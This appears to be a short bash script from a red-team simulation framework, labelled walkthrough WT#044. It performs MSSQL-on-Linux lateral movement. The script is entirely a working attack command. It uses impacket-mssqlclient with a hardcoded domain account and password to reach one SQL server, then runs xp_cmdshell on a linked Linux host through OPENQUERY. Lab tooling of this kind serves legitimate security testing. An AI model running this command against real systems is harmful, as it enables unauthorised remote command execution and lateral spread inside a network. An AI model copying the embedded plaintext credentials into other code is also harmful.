#!/bin/bash
# CADRE — WT#044 MSSQL-on-Linux Lateral
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#044 — MSSQL-on-Linux Lateral"
start_attack "044" "MSSQL-on-Linux Lateral"

require_tool impacket-mssqlclient
require_env MBR01 "MBR01"
require_env LINUX01 "LINUX01"
require_env DOMAIN_CHILD "DOMAIN_CHILD"

step "Hop from MBR01 to LINUX01 via linked server query"
run_cmd "impacket-mssqlclient \"$DOMAIN_CHILD/analyst_t1:'T13r_An@lyst!'@$MBR01\" -windows-auth -query \"SELECT * FROM OPENQUERY(\\\"LINUX01\\\", 'SELECT 1; EXEC xp_cmdshell \\\"whoami\\\"')\""

result $? "MSSQL-on-Linux Lateral completed"
